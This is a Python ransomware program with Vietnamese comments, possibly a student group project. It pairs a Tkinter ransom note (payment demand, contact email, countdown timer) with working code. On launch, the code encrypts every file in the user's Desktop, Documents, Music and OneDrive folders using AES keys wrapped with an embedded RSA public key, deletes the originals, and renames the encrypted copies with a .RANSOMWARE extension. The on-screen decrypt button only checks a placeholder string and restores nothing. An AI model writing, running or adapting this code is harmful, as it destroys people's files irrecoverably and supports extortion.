import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta
import base64
import os
import random
import concurrent.futures  # For concurrency
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Util.Padding import pad, unpad


# Banner
def decrypt_files():
    key = entry.get()
    if key == "your_decryption_key_here":
        messagebox.showinfo("Success", "Files decrypted!")
    else:
        messagebox.showerror("Error", "Incorrect decryption key.")

# Tạo cửa sổ chính
root = tk.Tk() 
root.title("THÔNG BÁO QUANG TRỌNG")
root.configure(bg="black")

# Icon (Biểu tượng skull)
skull_label = tk.Label(root, text="☠", font=("Arial", 50), fg="white", bg="black")
skull_label.pack(pady=20)

# Tên thông báo
encrypted_label = tk.Label(root, text="Tất Cả Các Tệp Của Bạn Đã Bị Mã Hóa !!!", font=("Arial", 20), fg="white", bg="black")
encrypted_label.pack()

# Thông báo
message = """
Các tệp quan trọng của bạn, bao gồm tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác hiện không thể truy cập.\n
Để khôi phục lại, bạn cần phải thanh toán.
"""
message_label = tk.Label(root, text=message, font=("Arial", 10), fg="white", bg="#8B0000", justify="left")
message_label.pack(pady=10)

# Hướng dẫn trả tiền
instructions_label = tk.Label(root, text="Đừng lo lắng, bạn có thể trả lại tất cả các tập tin của mình!\n\nĐể khôi phục chúng, hãy chuyển tiền đến địa chỉ bên dưới:\n\nSau đó gửi email cho chúng tôi theo địa chỉ: nhom4.ransomware@gmail.com kèm theo ID giao dịch của bạn.", font=("Arial", 12), fg="white", bg="black", justify="center")
instructions_label.pack(pady=10)

# Hiển thị tài khoản ngân hàng
bank_account_label = tk.Label(root, text="Tài Khoản Ngân Hàng: 1234567890", font=("Arial", 14), fg="yellow", bg="black")
bank_account_label.pack(pady=20)

# Cảnh báo
warning_label = tk.Label(root, text="Chú ý! Không đổi tên các tập tin được mã hóa. Nỗ lực giải mã của bên thứ ba có thể dẫn đến mất dữ liệu vĩnh viễn.", font=("Arial", 10), fg="white", bg="red")
warning_label.pack(fill="x", pady=10)

# Đếm ngược thời gian
def countdown(count):
    """Hàm đếm ngược từ thời gian đầu vào dạng hh:mm:ss"""
    # Tách giờ, phút, giây từ chuỗi đầu vào
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    # Hiển thị thời gian lên label
    label['text'] = '{:02}:{:02}:{:02}'.format(hour, minute, second)

    # Kiểm tra nếu còn thời gian để đếm ngược
    if hour > 0 or minute > 0 or second > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59

        # Gọi lại hàm countdown sau 1000ms (1 giây)
        root.after(1000, countdown, '{:02}:{:02}:{:02}'.format(hour, minute, second))
    else:
        label['text'] = "Time's up!"  # Hiển thị khi hết thời gian

# Tạo nhãn để hiển thị thời gian
label = tk.Label(root, text="", font=("Helvetica", 20))
label.pack(pady=20)

# Bắt đầu đếm ngược từ '01:30:00'
countdown('01:30:00')

# Nhập khóa giải mã
key_label = tk.Label(root, text="Nhập khóa giải mã:", font=("Arial", 12), fg="white", bg="black")
key_label.pack()

entry = tk.Entry(root, font=("Arial", 12), bg="gray", fg="white", insertbackground="white")
entry.pack(pady=5)

decrypt_button = tk.Button(root, text="Giải mã tập tin", command=decrypt_files, bg="gray", fg="white")
decrypt_button.pack(pady=10)


#################################################################################################
# Malware 

# Public Key for Encryption
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckcwNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)

def scanRecurse(baseDir):
    """
    Quét thư mục và trả về danh sách tất cả các tệp.
    """
    for entry in os.scandir(baseDir):
        try:
            if entry.is_file():
                yield entry
            elif entry.is_dir():
                yield from scanRecurse(entry.path)
        except PermissionError:
            print(f"Permission denied: {entry.path}")
            continue

def encrypt(dataFile, publicKey):
    """
    Mã hóa tệp bằng khóa công khai RSA và AES.
    """
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # Tạo khóa phiên ngẫu nhiên
    sessionKey = os.urandom(16)

    # Mã hóa khóa phiên bằng khóa công khai RSA
    cipherRSA = PKCS1_OAEP.new(RSA.import_key(publicKey))
    encryptedSessionKey = cipherRSA.encrypt(sessionKey)

    # Mã hóa dữ liệu bằng AES (mã hóa theo chế độ EAX để bảo mật toàn vẹn dữ liệu)
    cipherAES = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipherAES.encrypt_and_digest(data)

    # Lưu tệp mã hóa với tên mới
    fileName = dataFile.split(extension)[0]
    fileExtension = '.RANSOMWARE'  # Đổi phần mở rộng ở đây
    encryptedFile = f"{fileName}_{random.randint(1000, 9999)}{fileExtension}"
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipherAES.nonce, tag, ciphertext)]

    # Xóa tệp gốc sau khi mã hóa
    os.remove(dataFile)

def scan_and_encrypt_directories():
    """
    Quét các thư mục Desktop, Documents, Music, OneDrive và mã hóa các tệp, ngoại trừ các tệp có phần mở rộng được loại trừ.
    """
    # Lấy các thư mục người dùng cần quét trên Windows
    userProfile = os.getenv("USERPROFILE", "")  # Thư mục người dùng trên Windows
    directories = [
        os.path.join(userProfile, "Desktop"),
        os.path.join(userProfile, "Documents"),
        os.path.join(userProfile, "Music"),
        os.path.join(userProfile, "OneDrive")
    ]

    excludeExtension = ['.py', '.pem', '.exe', '.dll', '.sys', '.log', '.tmp', '.bat']

    # Sử dụng ThreadPoolExecutor để quét và mã hóa các tệp song song
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for directory in directories:
            print(f"Scanning directory: {directory}")
            if os.path.exists(directory):
                for item in scanRecurse(directory):
                    filePath = Path(item)
                    fileType = filePath.suffix.lower()

                    if fileType in excludeExtension:
                        continue

                    # Mã hóa tệp song song
                    futures.append(executor.submit(encrypt, filePath, pubKey))

        # Đợi tất cả các tệp hoàn thành việc mã hóa
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()  # Kiểm tra kết quả và bắt lỗi nếu có
            except Exception as e:
                print(f"Error encrypting file: {e}")

# Chạy hàm quét và mã hóa
scan_and_encrypt_directories()

root.mainloop()

